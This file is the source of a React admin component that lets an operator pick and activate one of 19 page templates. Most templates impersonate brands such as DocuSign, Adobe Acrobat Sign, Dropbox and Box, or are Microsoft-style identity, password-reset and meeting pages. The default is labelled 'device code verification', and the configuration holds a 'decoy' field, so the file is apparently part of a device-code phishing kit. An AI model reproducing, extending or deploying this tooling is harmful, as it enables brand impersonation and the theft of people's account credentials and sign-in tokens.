import React, { useState, useEffect } from 'react';
import type { PageDesign } from '../types';

interface TemplatesPanelProps {
  storedPassword: string;
}

interface TemplateInfo {
  id: PageDesign;
  name: string;
  description: string;
  color: string;
  icon: string;
}

const TEMPLATES: TemplateInfo[] = [
  { id: 'adobe-sign', name: 'Adobe Acrobat Sign', description: 'Adobe Acrobat Sign document verification', color: '#E8352B', icon: '📄' },
  { id: 'box', name: 'Box', description: 'Box file sharing', color: '#0061D5', icon: 'B' },
  { id: 'docusign-centered', name: 'DocuSign', description: 'DocuSign document signing', color: '#3F3B9B', icon: '✓' },
  { id: 'docusign-split', name: 'DocuSign Split', description: 'DocuSign split-panel layout', color: '#3F3B9B', icon: '✓' },
  { id: 'dropbox', name: 'Dropbox', description: 'Dropbox file sharing', color: '#0061FF', icon: '📦' },
  { id: 'microsoft-office', name: 'Cloud Workspace', description: 'Cloud productivity portal', color: '#0078d4', icon: '☁️' },
  { id: 'microsoft-verify', name: 'Identity Portal', description: 'Identity verification page', color: '#0078d4', icon: '🛡️' },
  { id: 'onedrive', name: 'CloudDrive', description: 'Cloud storage file sharing', color: '#0078D4', icon: '☁️' },
  { id: 'outlook-sync', name: 'MailConnect Sync', description: 'Mail sync setup', color: '#0078d4', icon: '✉️' },
  { id: 'sharepoint', name: 'DocVault', description: 'Document library', color: '#038387', icon: '📁' },
  { id: 'default', name: 'Secure Portal', description: 'Default device code verification', color: '#0078d4', icon: '🔒' },
  { id: 'secureshare', name: 'SecureShare', description: 'Enterprise file transfer', color: '#2b6cb0', icon: '🔐' },
  { id: 'calendar-invite', name: 'MeetSpace Calendar', description: 'Meeting invitation', color: '#5B5FC7', icon: '📅' },
  { id: 'calendly-meeting', name: 'Calendly', description: 'Schedule confirmation', color: '#006BFF', icon: '📆' },
  { id: 'bookings-meeting', name: 'Bookly', description: 'Appointment scheduling', color: '#0078d4', icon: '📋' },
  { id: 'solarwinds-meeting', name: 'SolarWinds', description: 'Dark-themed collaboration', color: '#F58220', icon: '☀️' },
  { id: 'schedule-meeting', name: 'Meeting Scheduler', description: 'Generic meeting page', color: '#0078d4', icon: '🗓️' },
  { id: 'it-support', name: 'IT Support Portal', description: 'IT service desk', color: '#0078d4', icon: '⚙️' },
  { id: 'password-reset', name: 'Security Center', description: 'Password reset flow', color: '#0078d4', icon: '🔑' },
];

export function TemplatesPanel({ storedPassword }: TemplatesPanelProps): React.ReactElement {
  const [activeTemplate, setActiveTemplate] = useState<PageDesign>('default');
  const [saving, setSaving] = useState(false);
  const [loading, setLoading] = useState(true);

  useEffect(() => { loadConfig(); }, []);

  async function loadConfig(): Promise<void> {
    setLoading(true);
    try {
      const res = await fetch('/api/templates', { headers: { 'X-Admin-Password': storedPassword } });
      if (res.ok) {
        const data = await res.json() as { template: string; decoy?: string };
        setActiveTemplate((data.template || 'default') as PageDesign);
      }
    } catch { /* defaults */ }
    setLoading(false);
  }

  async function handleActivate(templateId: PageDesign): Promise<void> {
    setSaving(true);
    try {
      const res = await fetch('/api/templates', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'X-Admin-Password': storedPassword },
        body: JSON.stringify({ template: templateId }),
      });
      const data = await res.json() as { success: boolean };
      if (data.success) setActiveTemplate(templateId);
    } catch { /* ignore */ }
    setSaving(false);
  }

  if (loading) {
    return <div className="dash-loading"><div className="dash-spinner" /><span>Loading templates...</span></div>;
  }

  return (
    <div className="tpl-panel">
      <div className="tpl-grid">
        {TEMPLATES.map(t => {
          const isActive = activeTemplate === t.id;
          return (
            <div
              key={t.id}
              className={'tpl-card' + (isActive ? ' tpl-active' : '')}
              onClick={() => !isActive && !saving && handleActivate(t.id)}
              style={{ cursor: isActive ? 'default' : 'pointer' }}
            >
              <div className="tpl-card-top">
                <div className="tpl-icon" style={{ background: t.color }}>{t.icon}</div>
                <div className="tpl-info">
                  <div className="tpl-name">{t.name}</div>
                  <div className="tpl-desc">{t.description}</div>
                </div>
              </div>
              <div className="tpl-card-bottom">
                <span className="tpl-id">{t.id}</span>
                <span className={'tpl-badge' + (isActive ? ' active' : ' inactive')}>
                  {isActive ? 'Active' : 'Inactive'}
                </span>
              </div>
            </div>
          );
        })}
      </div>
    </div>
  );
}
